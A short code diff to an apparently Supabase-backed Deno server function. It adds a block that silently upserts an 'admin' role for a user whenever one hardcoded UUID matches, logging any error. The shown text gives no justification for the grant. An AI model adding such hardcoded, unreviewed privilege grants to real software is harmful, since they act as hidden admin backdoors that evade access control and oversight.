@@ -150,6 +150,23 @@ Deno.serve(async (req) => {
       );
     }
 
+    try {
+      if (id_ies === '9f21b138-0027-44c8-9660-dc6706d57bc0') {
+        const { error: roleErr } = await supabaseAdmin
+          .from('user_roles')
+          .upsert({
+            user_id: userId,
+            role: 'admin',
+            granted_by: userData.user.id
+          }, { onConflict: 'user_id,role' });
+        if (roleErr) {
+          console.error('[RBAC] Failed to ensure admin role:', roleErr);
+        }
+      }
+    } catch (e) {
+      console.error('[RBAC] Unexpected error ensuring admin role:', e);
+    }
+
     // 8. Success Response
     return new Response(
       JSON.stringify({
